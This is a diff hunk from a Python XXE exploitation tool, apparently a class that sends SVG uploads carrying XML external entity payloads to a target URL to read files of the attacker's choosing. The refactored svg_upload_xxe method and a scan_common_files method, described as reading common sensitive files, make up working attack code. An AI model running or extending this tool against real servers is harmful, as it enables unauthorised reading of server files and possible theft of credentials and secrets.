@@ -435,21 +435,15 @@ class XXEExploiter:
     def svg_upload_xxe(self, file_path: str) -> dict:
         """SVG upload XXE payload."""
         payload = XXEPayloadGenerator.svg_xxe(file_path)
-        headers = dict(self.headers)
-        headers["Content-Type"] = "image/svg+xml"
-        req = urllib.request.Request(self.target_url, data=payload.encode("utf-8"),
-                                    method="POST")
-        for k, v in headers.items():
-            req.add_header(k, v)
+        original_headers = self.headers
+        svg_headers = dict(self.headers)
+        svg_headers["Content-Type"] = "image/svg+xml"
+        self.headers = svg_headers
         try:
-            resp = urllib.request.urlopen(req, timeout=self.timeout)
-            body = resp.read().decode("utf-8", errors="replace")
-            return {"status": resp.status, "path": file_path, "content": body}
-        except urllib.error.HTTPError as e:
-            body = e.read().decode("utf-8", errors="replace")
-            return {"status": e.code, "path": file_path, "content": body}
-        except Exception as e:
-            return {"status": 0, "path": file_path, "content": str(e)}
+            status, body, _ = self._send(payload)
+        finally:
+            self.headers = original_headers
+        return {"status": status, "path": file_path, "content": body}
 
     def scan_common_files(self) -> list:
         """Read several common sensitive files."""
